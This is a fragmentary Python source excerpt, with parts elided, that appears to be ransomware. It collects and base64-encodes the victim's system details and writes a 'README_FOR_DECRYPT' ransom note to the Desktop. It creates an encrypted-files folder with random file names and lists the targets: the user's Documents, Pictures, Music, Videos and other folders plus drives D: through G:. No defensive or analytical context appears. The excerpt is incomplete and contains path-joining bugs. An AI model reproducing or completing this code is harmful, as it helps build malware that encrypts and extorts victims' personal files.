...
victim_info = base64.b64encode(str(platform.uname()).encode())
...
def write_instruction(dir, ext):
    try:
        files = open(os.path.join(dir, 'README_FOR_DECRYPT.' + ext), 'w')
...
def make_directory(file_path):
    directory = os.path.join(file_path, encfolder)
...
def generate_file(file_path, filename):
    ...
    newfilename = os.path.join(file_path, encfolder, text_generator(36, '1234567890QWERTYUIOPASDFGHJKLZXCVBNMqwertyuiopasdfghjklzxcvbnm'))
    try:
...
listdir = (os.path.join(userhome, 'Contacts'),
 os.path.join(userhome + 'Documents'),
 os.path.join(userhome + 'Downloads'),
 os.path.join(userhome + 'Favorites'),
 os.path.join(userhome + 'Links'),
 os.path.join(userhome + 'My Documents'),
 os.path.join(userhome + 'My Music'),
 os.path.join(userhome + 'My Pictures'),
 os.path.join(userhome + 'My Videos'),
 'D:\\',
 'E:\\',
 'F:\\',
 'G:\\',
...
write_instruction(os.path.join(userhome, 'Desktop'), 'txt')
